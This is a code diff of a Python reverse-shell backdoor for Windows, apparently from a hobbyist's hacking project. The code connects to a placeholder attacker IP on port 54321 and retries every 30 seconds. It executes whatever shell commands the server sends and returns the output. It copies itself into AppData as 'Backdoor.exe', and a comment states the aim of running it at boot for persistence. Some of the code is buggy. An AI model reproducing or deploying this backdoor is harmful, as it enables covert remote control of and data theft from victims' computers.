@@ -7,7 +7,7 @@ import sys
 import os
 import shutil
 
-#relaible_recv fun. allows us to recieve large bytes of data without the program breaking 
+#It allows us to recieve large bytes of data without the program breaking 
 def relaible_recv():
 	global json_data 
 	json_data=""
@@ -18,16 +18,24 @@ def relaible_recv():
 		except ValueError:
 			continue
 
+#it allows us to send large bytes of data
 def relaible_send(data):
 	json.dumps(data)
 	sock.send(json_data)
 
-#shell fun. allows us to recive the commands fromthe server and process them to execute in the terminal
+#It allows us to recive the commands from the server and process them to execute in the terminal
 def shell():
 	while True:
 		command=relaible_recv()
 		if command=='q':
 			break
+			
+		elif command[:2]=='cd' and len(command)>1:
+			try:
+				os.chdir(command[3:])
+			except:
+				continue
+
 		else:
 			try:
 				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
@@ -35,19 +43,20 @@ def shell():
 				relaible_send(result)
 
 			except:
-				print("[!!]Can't execute the command "+command)
+				relaible_send("[!!]Can't execute the command: "+command)
 
 
-#connection fun. connects us to the server 
+#It connects us to the server 
 def connection():
 	while True:
 		time.sleep(30)
 		try:
-			sock.connect(("<ip addr.>",54321))
+			sock.connect(("<ip addr>",54321))
 			shell()
 		except:
 			connection()
-		
+
+#It copies our reverse shell once executed and makes it run as soon as the machine boots up		
 location=os.environ["appdata"]+"\\Backdoor.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable,location)
